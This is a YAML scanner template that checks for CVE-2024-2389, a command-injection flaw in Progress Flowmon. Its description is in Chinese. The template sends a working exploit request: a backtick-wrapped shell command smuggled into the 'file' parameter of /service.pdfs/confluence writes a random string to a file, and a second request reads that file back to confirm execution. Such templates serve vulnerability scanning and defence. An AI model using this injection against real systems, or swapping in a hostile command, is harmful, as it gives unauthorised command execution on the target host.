id: CVE-2024-2389
info:
  name: Progress Flowmon rce
  author: laohuan12138
  severity: critical
  verified: true
  description: |-
    Progress Flowmon 11.1.14之前的11.x版本和12.3.5之前的12.x版本存在命令执行漏洞，可执行系统命令获取主机权限。
  references:
    - https://mp.weixin.qq.com/s/-_SSnuJ5eWw1xbAdGG5tvg
    - https://nvd.nist.gov/vuln/detail/CVE-2024-2389
  tags: cve,rce,cve2024
  created: 2024/4/17

set:
  filename: randomLowercase(6)
  randstr: randomLowercase(10)

rules:
  r0:
    request:
      method: GET
      path: /service.pdfs/confluence?lang=en&file=`echo+"{{randstr}}">{{filename}}.txt`
    expression: response.status == 403

  r1:
    request:
      method: GET
      path: /{{filename}}.txt
    expression: response.status == 200 && response.body.bcontains(bytes(randstr))

expression: r0() && r1()
